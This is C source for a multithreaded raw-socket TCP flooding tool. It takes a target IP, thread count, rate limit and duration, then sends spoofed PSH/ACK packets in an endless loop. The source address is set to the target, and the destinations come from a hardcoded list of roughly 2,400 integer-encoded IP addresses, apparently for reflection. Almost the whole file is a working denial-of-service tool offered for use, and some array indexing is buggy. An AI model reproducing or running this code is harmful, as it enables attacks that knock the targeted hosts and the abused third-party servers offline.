/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}
struct tcpopts {
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;
        uint8_t tstamp;
        uint8_t tslen;
        uint8_t tsno;
        uint8_t tsval;
        uint8_t tsclock;
        uint8_t tsclockval;
        uint8_t tssendval;
};


void setup_tcpopts_header(struct tcpopts *opts)
{
    opts->nop_nouse = 0x01;
    opts->nop_nouse2 = 0x01;
    opts->nop_nouse3 = 0x01;
    opts->msskind = 0x02;
    opts->mssvalue = htons(1460);
    opts->msslen = 0x04;
    opts->wskind = 0x03;
    opts->wslen = 0x03;
    opts->wsshiftcount = 0x07;
    opts->sackkind = 0x04;
    opts->sacklen = 0x02;
    opts->tstamp = 0x08;
    opts->tslen = 0x0a;
    opts->tsno = (int)time(NULL);
    opts->tsval = 0xd8;
    opts->tsclock = 0xd9;
    opts->tsclockval = 0x68;
    opts->tssendval = 0xa3;
}
void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}
int ports[3] = {80, 443, 22};


int seq[7] = {14703, 13243, 11784, 10323, 8863, 7403, 5943};
int ackseq[7] = {14791, 13331, 11872, 10411, 8951, 7491, 6031};
void setup_tcp_header(struct tcphdr *tcph)
{
  tcph->dest = htonl(ports[rand_cmwc()%5]);
	tcph->source = rand();
  tcph->ack_seq = htons(ackseq[randnum(0, 7)]);
  tcph->seq = htons(seq[randnum(0, 7)]);
	tcph->res2 = 0;
	tcph->doff = 5;
  //tcph->syn = 1;
	tcph->psh = 1;
	tcph->ack = 1;
	//tcph->urg = 1;
	tcph->window = rand();
	tcph->check = 0;
	tcph->urg_ptr = rand();
}

void *flood(void *par1)
{
int class[2437]= {1760222415
,1760222408
,1760222354
,1760222378
,1760222425
,1760222439
,1760222374
,1760222462
,1760222379
,1760222384
,1760222410
,1760222413
,1760222405
,1760222382
,1760222373
,1760222383
,1760222381
,1760222380
,1760222361
,1760222409
,1760222424
,1760222345
,1760222342
,1760222372
,1760222421
,1760222440
,1760222412
,1760222344
,1760222457
,1760222363
,1760222455
,1760222456
,1760222385
,1760222404
,1760222448
,1760222403
,1760222441
,1760222438
,1760222411
,1760222376
,1760222377
,1760222292
,1760222343
,1760222435
,1760222436
,1760222402
,1760222357
,1760222434
,1760222414
,1760222318
,1760222443
,1760222444
,1760222423
,1760222371
,1760222370
,1760222375
,1760222362
,1760222352
,1760222459
,1760222450
,1760222355
,1760222318
,1760222342
,1760222343
,1760222344
,1760222345
,1760222352
,1760222354
,1760222355
,1760222357
,1760222361
,1760222362
,1760222363
,1760222370
,1760222371
,1760222372
,1760222373
,1760222374
,1760222375
,1760222376
,1760222377
,1760222378
,1760222379
,1760222380
,1760222381
,1760222382
,1760222383
,1760222384
,1760222385
,1760222386
,1760222393
,1760222402
,1760222403
,1760222404
,1760222405
,1760222408
,1760222409
,1760222410
,1760222411
,1760222412
,1760222413
,1760222414
,1760222415
,1760222419
,1760222420
,1760222421
,1760222423
,1760222424
,1760222425
,1760222427
,1760222434
,1760222435
,1760222436
,1760222438
,1760222439
,1760222440
,1760222441
,1760222443
,1760222444
,1760222448
,1760222450
,1760222455
,1760222456
,1760222457
,1760222459
,1760222461
,1760222462
,1760222281
,1760222292
,397932408
,397932389
,397932412
,397932406
,397932385
,397932410
,397932394
,397932403
,397932412
,397932398
,397932409
,397932412
,397932398
,2366358529
,2366358657
,2366358660
,2366358661
,2366358669
,2366358671
,2366358674
,2366358679
,2366358544
,2366358545
,2366358530
,2366358548
,2366358554
,2366358531
,2366358561
,2366358565
,2366358593
,2366358890
,2366358898
,2366358906
,2366358913
,2366358918
,2366358977
,2366358882
,2366359041
,2366359400
,2366359405
,2366359408
,2366359412
,2366359413
,2366359414
,2366359425
,2366359433
,2366359434
,2366359441
,2366359457
,2366359458
,2366359469
,2366359478
,2366359481
,2366359489
,2366359497
,2366359505
,2366359317
,2366359513
,2366359521
,2366359523
,2366359536
,2366359539
,2366359540
,2366359547
,2366359375
,2366359378
,2366359385
,2366367232
,2366367233
,2366367361
,2366367365
,2366367380
,2366367249
,2366367269
,2366367270
,2366367293
,2366367297
,2366367592
,2366367594
,2366367595
,2366367499
,2366367603
,2366367501
,2366367621
,2366367642
,2366367643
,2366367654
,2366367687
,2366367571
,2650711552
,3453804906
,3453805005
,3453805007
,3453805026
,3453805027
,3453805046
,3453804882
,3453804886
,3453804890
,3453805550
,3453805554
,3453805683
,3453805689
,3453805659
,3453805839
,3453805842
,3453805846
,3453805858
,3453805885
,3453805920
,3460800068
,3460800357
,3460800358
,3460800363
,3460800364
,3460800407
,3460800443
,3460800453
,3460800457
,3460800483
,3460800484
,3460800485
,3460800486
,3460800487
,3460800488
,3460800489
,3460800490
,3460800496
,3460800497
,3460800498
,3460800306
,3460800344
,3515770625
,3515770634
,3515770636
,3515770626
,3515770628
,3515770630
,3515770631
,3515770632
,3515770633
,3522006134
,3522006243
,3522006246
,3522006248
,3522006058
,3522006059
,3522006078
,3522006086
,3522006088
,3642028545
,3642028555
,3642028655
,3642028673
,3642028681
,3642028558
,3642028689
,3642028559
,3642028697
,3642028560
,3642028705
,3642028708
,3642028561
,3642028719
,3642028562
,3642028724
,3642028729
,3642028563
,3642028737
,3642028745
,3642028761
,3642028765
,3642028769
,3642028772
,3642028781
,3642028782
,3642028577
,3642028578
,3642028585
,3642028586
,3642028588
,3642028609
,3642028551
,3642028615
,3642028623
,3642028628
,3642028553
,3642028641
,397930534
,397930535
,397930536
,397930537
,397930502
,397930566
,397931393
,397931396
,397931397
,397931398
,397931399
,397931400
,397931402
,397931404
,397931406
,397931407
,397931279
,397931414
,397931415
,397931280
,397931297
,397931273
,397931553
,397931554
,397931556
,397931558
,397931559
,397931561
,397931565
,397931566
,397931569
,397931572
,397931574
,397931578
,397931580
,397931907
,397931908
,397931952
,397931969
,397931971
,397931972
,397931973
,397931974
,397931975
,397931976
,397931977
,397931978
,397931979
,397931980
,397931981
,397931983
,397931984
,397931985
,397931986
,397931987
,397931993
,397931994
,397932232
,397932252
,397932262
,397932264
,397932270
,397932272
,397932273
,397932274
,397932276
,397932278
,397932279
,397932389
,397932394
,397932398
,397932406
,397932408
,397932410
,397932412
,397932385
,387610891
,387610894
,387610896
,387610897
,387610899
,387610900
,387610901
,387610905
,387610883
,387610940
,387610887
,387610888
,387610889
,2366358599
,2366358554
,2366358690
,2366358687
,2366358565
,2366358666
,2366358542
,2366358691
,2366358548
,2366358596
,2366358605
,2366358535
,2366358558
,2366358606
,2366358659
,2366358603
,2366358660
,2366358550
,2366358547
,2366358671
,397931416
,397931412
,2366358692
,2366358674
,397931410
,2366358662
,2366358675
,2366358679
,397932402
,397932404
,397931419
,397931580
,397931557
,397931418
,397931420
,397931577
,397932409
,3642028691
,3642028612
,3642028546
,3642028660
,2366359547
,3642028631
,3642028623
,2366367592
,3642028557
,3642028701
,2366367378
,2366367621
,3642028549
,3642028581
,3642028772
,3642028782
,2366367603
,2366367607
,3642028588
,3642028556
,3642028619
,3642028584
,2366359382
,3642028724
,3642028708
,3642028719
,3642028746
,2366367594
,3642028583
,3642028548
,2366359435
,2366359523
,3642028585
,3642028653
,2366367372
,2366367654
,3642028569
,3642028586
,2366367600
,2366367598
,2366367365
,2366367599
,2366359529
,3642028563
,3642028615
,3642028589
,3642028555
,3642028677
,3642028633
,2366367533
,3642028674
,3642028553
,2366359536
,3642028578
,3642028675
,2366359349
,3642028781
,2366367499
,2366359532
,2366359347
,2366367377
,2366359319
,2366359350
,2366367501
,2366359308
,2366359317
,2366359309
,2366359343
,2366359469
,2366359478
,2366359483
,2366359306
,2366359335
,2366367507
,2366367687
,2366359345
,2366367692
,2366359481
,2366367695
,2366367694
,387610904
,387610905
,387610888
,387610884
,387610892
,387610902
,387610885
,387610890
,387610894
,387610889
,387610903
,387610900
,387610893
,387610882
,387610901
,3522006242
,387610886
,387610896
,387610883
,387610899
,387610898
,387610897
,387610891
,2366367570
,2366367569
,2366367572
,2366367558
,2366367571
,3642028686
,2366367273
,397932251
,2366367243
,2366367282
,2366367242
,397932236
,397932167
,397932153
,2366367293
,2366367269
,2366367271
,763759181
,763759230
,763759489
,764708626
,764708659
,763759308
,3253976810
,763759144
,763759148
,763759180
,763759371
,1760222379
,763759528
,3253976759
,759078988
,1760222419
,1760222443
,764708637
,763759375
,763759474
,3253976723
,763759181
,3253976772
,3253976789
,3253976723
,763759203
,1760222424
,763759146
,763759489
,763759198
,763759144
,763759149
,763759488
,759078937
,1760222318
,763759535
,1760222281
,3253976789
,764708646
,764708637
,763759367
,1760222386
,763759143
,759078916
,763759534
,764708614
,763759474
,3253976824
,1760222372
,763759236
,3253976591
,763759314
,3253976619
,764708656
,3253976722
,3253976750
,3253976750
,764708611
,763759148
,1760222375
,764708658
,3253976588
,3253976581
,1760222429
,764708675
,3253976617
,3253976812
,763759141
,763759182
,759078936
,1760222361
,763759146
,763759149
,764708664
,3253976813
,3253976820
,3253976777
,763759139
,763759139
,763759469
,3253976800
,3253976723
,3253976790
,3253976587
,763759564
,764708614
,764708664
,3253976760
,3253976789
,1760222462
,3253976806
,759078916
,1760222374
,1760222440
,3253976591
,764708655
,3253976695
,763759317
,3253976763
,763759210
,1760222419
,763759210
,763759123
,763759143
,763759150
,1760222436
,763759465
,3253976692
,3253976823
,3253976719
,763759488
,759078923
,1760222460
,763759214
,763759140
,3253976752
,764708657
,3253976606
,763759229
,3253976777
,3253976616
,3253976606
,763759308
,763759212
,1760222419
,3253976611
,759078936
,3253976591
,763759526
,763759214
,763759178
,763759316
,3253976755
,763759511
,763759316
,763759491
,764708656
,763759469
,763759318
,3253976621
,763759150
,764708656
,763759391
,3253976728
,763759479
,3253976581
,3253976773
,763759549
,1760222449
,763759214
,763759369
,1760222381
,763759108
,763759108
,763759369
,759078989
,759079097
,759078935
,763759180
,3253976770
,763759367
,3253976624
,763759149
,3253976589
,763759504
,759078934
,764708654
,763759142
,1760222363
,1760222384
,1760222413
,763759111
,759079140
,759078929
,763759227
,763759488
,1760222370
,763759519
,763759275
,3253976728
,763759154
,3253976580
,3253976760
,3253976782
,3253976728
,3253976772
,763759140
,3253976773
,3253976792
,763759310
,3253976629
,763759532
,3253976717
,763759211
,763759532
,763759154
,764708658
,763759487
,764708629
,763759113
,763759474
,764708611
,763759205
,3253976693
,763759181
,763759227
,763759310
,3253976774
,3253976803
,763759213
,763759515
,3253976816
,3253976796
,3253976785
,763759146
,3253976754
,763759181
,763759228
,763759145
,763759180
,763759182
,763759461
,763759276
,3253976785
,763759144
,763759124
,3253976778
,763759228
,763759182
,763759107
,763759139
,763759179
,763759555
,763759213
,3253976778
,763759180
,3253976715
,3253976712
,763759143
,763759489
,763759535
,763759144
,763759138
,763759138
,763759138
,763759154
,763759108
,763759146
,3253976789
,763759148
,763759549
,763759532
,763759491
,3253976621
,3253976620
,3253976807
,763759486
,763759143
,763759138
,763759181
,763759108
,3253976775
,763759144
,763759204
,763759148
,763759179
,3253976628
,3253976579
,763759198
,3253976823
,763759139
,763759142
,763759526
,3253976789
,763759235
,3253976783
,763759480
,763759234
,3253976815
,3253976781
,763759504
,763759560
,763759522
,763759516
,3253976592
,763759533
,3253976761
,3253976789
,763759506
,763759236
,3253976593
,763759145
,763759556
,763759491
,763759204
,763759173
,763759236
,763759527
,3253976812
,763759138
,3253976592
,763759147
,763759144
,763759114
,3253976812
,763759150
,3253976582
,1760222376
,763759510
,3253976579
,3253976618
,3253976718
,763759213
,763759476
,763759181
,763759501
,763759480
,3253976618
,3253976784
,763759307
,3253976784
,3253976823
,763759145
,763759114
,763759150
,763759118
,763759478
,763759226
,3253976776
,763759141
,763759141
,763759365
,763759365
,3253976586
,763759145
,763759178
,3253976751
,763759139
,763759493
,763759562
,763759146
,763759139
,3253976791
,763759149
,3253976592
,3253976776
,763759229
,3253976775
,763759505
,763759517
,763759139
,763759202
,763759314
,763759314
,763759558
,763759205
,763759145
,763759142
,763759178
,763759138
,763759138
,3253976728
,763759548
,3253976586
,763759147
,3253976580
,763759560
,763759517
,763759179
,763759318
,763759140
,3253976749
,763759369
,3253976593
,763759543
,763759213
,763759511
,763759148
,763759144
,763759306
,3253976579
,763759506
,763759179
,763759179
,3253976792
,3253976620
,763759150
,763759519
,763759309
,3253976809
,763759203
,763759567
,763759567
,3253976792
,3253976824
,763759469
,3253976716
,763759317
,3253976617
,763759195
,763759226
,763759463
,763759142
,763759180
,763759141
,763759195
,763759139
,763759139
,763759517
,763759371
,763759147
,763759559
,3253976616
,3253976606
,763759114
,3253976719
,763759555
,763759130
,3253976829
,763759141
,763759147
,3253976737
,763759149
,3253976693
,763759198
,763759117
,763759130
,3253976628
,763759140
,763759539
,763759142
,3253976792
,763759237
,763759522
,3253976822
,3253976594
,3253976631
,763759144
,763759210
,763759146
,763759541
,3253976828
,3253976828
,763759479
,763759374
,3253976825
,763759140
,763759485
,3253976716
,763759510
,763759144
,3253976777
,763759375
,3253976777
,763759479
,763759234
,763759309
,3253976811
,3253976619
,763759144
,3253976734
,3253976734
,763759203
,3253976592
,763759500
,763759488
,3253976606
,763759144
,3253976764
,763759149
,3253976728
,3253976606
,3253976737
,763759506
,3253976589
,3253976594
,763759109
,763759213
,763759145
,3253976580
,763759227
,763759462
,763759462
,763759145
,3253976771
,3253976823
,3253976736
,3253976736
,763759238
,3253976800
,763759197
,763759482
,763759274
,763759516
,763759203
,763759523
,3253976740
,763759182
,763759147
,763759178
,763759180
,3253976806
,763759202
,763759278
,763759238
,763759366
,763759366
,763759556
,763759500
,763759142
,763759149
,763759507
,763759204
,763759371
,763759556
,763759179
,763759146
,3253976695
,763759235
,763759492
,763759367
,763759178
,763759182
,3253976594
,763759180
,763759143
,3253976629
,763759181
,763759138
,3253976789
,3253976591
,3253976811
,3253976712
,763759277
,3253976731
,3253976775
,763759154
,763759140
,763759178
,763759125
,763759463
,763759275
,763759147
,763759365
,3253976829
,763759142
,763759465
,763759523
,3253976737
,763759539
,763759116
,3253976736
,763759204
,763759230
,3253976776
,3253976812
,763759524
,3253976583
,3253976771
,763759236
,763759512
,763759566
,763759130
,763759147
,763759522
,3253976761
,763759486
,3253976585
,763759141
,763759543
,3253976797
,3253976750
,763759196
,763759180
,3253976621
,763759143
,763759147
,3253976589
,763759495
,3253976618
,763759315
,763759462
,763759483
,763759543
,763759474
,763759204
,763759147
,763759560
,3253976731
,763759213
,763759172
,3253976695
,763759206
,763759141
,3253976748
,3253976707
,763759310
,763759557
,3253976587
,3253976729
,763759139
,3253976786
,3253976731
,763759130
,3253976800
,763759515
,763759148
,3253976728
,3253976585
,763759493
,763759202
,763759506
,763759557
,763759555
,763759467
,763759513
,759078925
,3253976825
,763759212
,3253976593
,763759178
,763759490
,3253976695
,763759391
,763759206
,763759513
,763759148
,763759492
,3253976820
,763759143
,763759123
,3253976809
,763759145
,3253976781
,3253976713
,763759532
,763759178
,763759309
,763759143
,3253976781
,763759146
,763759144
,763759516
,763759557
,763759306
,763759116
,763759532
,763759148
,763759178
,3253976789
,3253976822
,3253976695
,763759144
,763759463
,3253976828
,3253976783
,3253976582
,3253976780
,3253976824
,763759495
,763759146
,763759480
,763759467
,3253976809
,3253976789
,3253976695
,763759211
,763759138
,763759147
,763759307
,763759108
,3253976760
,763759149
,763759140
,763759143
,763759147
,763759210
,3253976594
,3253976805
,3253976776
,763759211
,763759141
,3253976589
,3253976628
,763759531
,3253976716
,763759482
,3253976606
,763759144
,763759150
,763759148
,3253976784
,3253976628
,763759142
,763759538
,3253976695
,763759194
,763759149
,763759556
,763759236
,763759214
,763759498
,3253976579
,763759150
,763759142
,3253976786
,3253976606
,763759230
,763759139
,763759549
,763759122
,763759142
,763759141
,763759180
,763759205
,3253976736
,763759492
,3253976706
,763759567
,763759234
,763759212
,763759555
,763759197
,763759540
,763759557
,3253976588
,763759109
,3253976801
,763759474
,763759487
,763759147
,3253976731
,3253976629
,3253976778
,763759107
,3253976800
,763759211
,763759196
,763759467
,763759145
,763759226
,3253976795
,763759214
,3253976713
,763759118
,763759181
,763759308
,3253976709
,3253976606
,763759179
,3253976589
,763759310
,3253976592
,763759140
,763759182
,763759501
,763759178
,763759147
,763759150
,3253976783
,763759182
,763759141
,763759147
,3253976748
,763759532
,763759145
,763759556
,3253976586
,763759141
,763759130
,763759559
,3253976714
,3253976755
,3253976591
,763759109
,3253976814
,763759146
,3253976593
,763759145
,763759173
,763759202
,3253976819
,763759534
,763759179
,763759181
,763759515
,763759143
,763759481
,3253976591
,763759110
,763759182
,763759212
,3253976802
,3253976775
,763759212
,763759181
,763759470
,763759205
,763759130
,3253976820
,3253976782
,763759174
,3253976606
,763759181
,763759520
,763759139
,763759534
,3253976714
,3253976792
,763759540
,3253976806
,763759182
,763759237
,763759213
,763759555
,3253976627
,3253976627
,3253976582
,3253976819
,763759178
,763759143
,763759187
,763759229
,3253976806
,763759130
,763759138
,763759379
,3253976590
,763759139
,763759144
,763759549
,763759374
,3253976696
,763759531
,763759214
,763759179
,763759234
,3253976749
,763759141
,3253976753
,3253976778
,3253976810
,763759227
,3253976759
,763759182
,3253976695
,3253976808
,3253976617
,763759230
,763759143
,763759182
,763759557
,763759465
,763759211
,763759206
,3253976807
,3253976624
,763759179
,763759182
,763759274
,763759143
,763759212
,763759556
,763759126
,763759182
,3253976593
,763759375
,763759521
,763759529
,3253976775
,763759374
,763759306
,763759480
,763759366
,763759148
,763759307
,763759138
,763759368
,3253976771
,763759181
,763759213
,763759378
,763759516
,3253976799
,3253976775
,763759510
,763759480
,3253976775
,763759235
,763759505
,763759140
,763759179
,763759145
,3253976776
,3253976727
,3253976750
,763759237
,763759214
,763759194
,763759408
,763759148
,759078917
,763759144
,763759480
,759079136
,3253976782
,763759480
,764708610
,3253976695
,763759126
,763759310
,763759187
,763759316
,3253976807
,3253976776
,763759557
,3253976792
,763759148
,3253976713
,3253976728
,763759504
,759078925
,763759537
,763759212
,3253976808
,759078919
,3253976713
,759079132
,764708656
,764708659
,3253976586
,3253976770
,764708658
,763759211
,763759149
,1760222371
,763759226
,3253976606
,763759178
,3253976695
,763759195
,3253976627
,1760222440
,1760222357
,763759557
,763759489
,763759529
,763759170
,763759150
,763759149
,1760222281
,3253976606
,3253976766
,3253976811
,759079113
,1760222461
,1760222455
,3253976606
,763759147
,3253976696
,763759505
,763759149
,763759308
,763759235
,1760222404
,763759138
,1760222382
,3253976825
,763759369
,763759178
,3253976587
,763759149
,3253976586
,3253976712
,1760222420
,1760222281
,763759140
,3253976765
,763759142
,3253976619
,763759548
,763759517
,1760222373
,3253976827
,764708654
,763759179
,1760222421
,759078933
,1490142466
,1760222286
,764708629
,763759212
,763759476
,763759548
,3253976731
,759078920
,763759179
,1760222388
,764708629
,1760222371
,763759150
,764708656
,3253976813
,763759179
,763759211
,759078918
,763759141
,1760222438
,1760222388
,763759493
,763759506
,763759144
,3253976730
,763759522
,1760222457
,763759261
,763759179
,763759489
,3253976728
,1760222441
,763759368
,763759178
,763759235
,1760222304
,763759210
,764708629
,763759512
,1490142517
,763759521
,763759261
,763759141
,759079113
,764708656
,1760222440
,759078931
,1760222383
,3253976727
,763759238
,763759150
,3253976773
,763759480
,763759147
,764708627
,3253976728
,1760222276
,764708656
,764708665
,3253976785
,764708655
,763759150
,1760222276
,763759259
,759078954
,3253976590
,763759214
,1760222419
,763759529
,763759262
,763759520
,3253976621
,763759511
,763759381
,763759178
,763759182
,763759178
,763759143
,3253976804
,3253976727
,763759520
,763759259
,764708654
,763759416
,763759180
,764708620
,763759147
,1760222378
,3253976825
,3253976624
,763759203
,759079137
,764708659
,763759489
,763759530
,763759140
,763759143
,3253976792
,759079130
,763759146
,763759212
,3253976680
,763759474
,759078933
,1760222438
,3253976620
,759078932
,763759146
,763759230
,763759112
,763759371
,1760222379
,1760222285
,1760222440
,764708655
,763759143
,763759315
,1760222378
,763759138
,3253976820
,764708611
,763759266
,763759174
,1760222455
,763759181
,763759140
,759078926
,3253976690
,764708611
,764708657
,3253976709
,3253976826
,3253976692
,764708613
,763759205
,1760222377
,759078990
,763759210
,763759182
,764708658
,763759180
,3253976679
,3253976781
,3253976677
,1760222443
,759079138
,759078934
,3253976792
,759078927
,763759138
,763759138
,763759143
,3253976763
,3253976590
,759078935
,3253976710
,763759145
,3253976790
,763759462
,764708658
,1760222419
,763759214
,763759145
,763759108
,1760222457
,763759549
,764708664
,763759130
,3253976588
,763759557
,3253976588
,763759370
,3253976708
,1760222445
,763759178
,763759234
,764708611
,763759171
,1760222462
,759078988
,763759521
,763759142
,763759235
,763759174
,759079088
,763759229
,763759211
,759078920
,763759143
,1760222354
,3253976819
,759079139
,763759484
,3253976824
,763759202
,759078950
,763759182
,1760222281
,763759149
,764708658
,763759505
,764708654
,1760222436
,1760222461
,763759124
,3253976810
,764708657
,763759534
,1760222409
,1760222356
,1760222450
,3253976695
,3253976775
,763759480
,763759142
,763759531
,3253976712
,763759229
,3253976710
,759079131
,1760222428
,763759113
,763759170
,763759515
,3253976776
,1760222461
,763759117
,3253976813
,759079129
,3253976619
,763759508
,763759495
,764708618
,763759149
,763759470
,1760222427
,763759519
,763759374
,764708619
,763759107
,763759146
,3253976585
,763759317
,1760222448
,763759202
,763759142
,3253976691
,759078990
,764708655
,759079113
,763759259
,763759146
,763759266
,1760222428
,763759182
,763759140
,763759140
,3253976826
,763759262
,3253976789
,763759555
,763759391
,763759130
,763759149
,764708635
,3253976589
,1760222439
,1760222374
,763759182
,3253976815
,764708635
,763759202
,763759562
,3253976579
,1760222443
,763759258
,764708656
,759078920
,763759308
,1760222275
,3253976760
,763759203
,764708635
,759079133
,763759483
,763759536
,1760222393
,763759141
,763759468
,763759148
,763759171
,763759555
,3253976588
,764708656
,3253976583
,3253976828
,763759213
,763759142
,1760222419
,763759559
,763759154
,1760222443
,763759496
,759079142
,763759405
,763759143
,763759519
,763759474
,763759142
,763759550
,763759150
,759078988
,3253976696
,3253976678
,763759149
,3253976606
,763759171
,759078922
,1760222450
,763759149
,763759118
,3253976761
,759079132
,759078924
,3253976606
,763759117
,759078923
,763759260
,759078939
,763759141
,763759559
,763759475
,763759229
,763759306
,3253976606
,763759516
,763759523
,763759278
,763759211
,763759170
,763759148
,3253976818
,3253976786
,763759522
,3253976583
,763759238
,763759115
,3253976729
,3253976594
,763759555
,3253976775
,763759173
,763759144
,763759150
,763759149
,763759544
,763759210
,763759141
,763759150
,3253976606
,3253976580
,763759145
,763759260
,763759227
,3253976586
,763759307
,3253976775
,763759374
,763759475
,3253976761
,763759139
,763759237
,763759115
,763759483
,763759495
,763759562
,763759466
,763759214
,763759369
,3253976779
,3253976792
,763759230
,763759472
,763759108
,763759482
,763759521
,763759505
,763759562
,763759144
,763759228
,763759535
,3253976707
,763759238
,3253976778
,3253976679
,3253976693
,763759556
,3253976776
,763759472
,763759258
,3253976682
,763759150
,763759146
,763759145
,763759541
,3253976589
,763759309
,3253976808
,3253976606
,3253976708
,3253976711
,3253976711
,763759486
,763759533
,763759138
,763759521
,3253976693
,3253976824
,763759476
,763759482
,763759266
,3253976706
,763759546
,3253976822
,763759545
,3253976790
,763759508
,763759541
,3253976693
,3253976617
,763759140
,763759108
,763759532
,763759547
,763759514
,763759413
,763759140
,763759148
,3253976622
,3253976692
,763759533
,763759541
,763759413
,763759145
,763759260
,763759130
,763759108
,763759141
,3253976772
,763759531
,3253976829
,763759266
,3253976710
,3253976775
,763759261
,763759489
,763759148
,3253976798
,763759541
,763759140
,763759206
,763759318
,763759519
,3253976694
,763759515
,763759150
,763759512
,763759309
,763759139
,763759262
,763759237
,763759266
,3253976693
,3253976606
,763759150
,3253976827
,1760222419














};


	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
  //struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr); // including our specified tcp options in the datagram.
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htonl(ports[rand_cmwc()%5]);
	sin.sin_addr.s_addr = inet_addr(td); 
 
 
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
  //setup_tcpopts_header(opts);

	tcph->dest = htonl(ports[rand_cmwc()%5]);

	iph->daddr = htonl(class[rand_cmwc()%2437]);
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

		iph->saddr = sin.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		tcph->seq = rand_cmwc() & 0xFFFF;
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 6){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target IP> <port> <thread count> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");
  struct sockaddr_in sin;
  sin.sin_addr.s_addr = inet_addr(argv[1]);
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 20;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}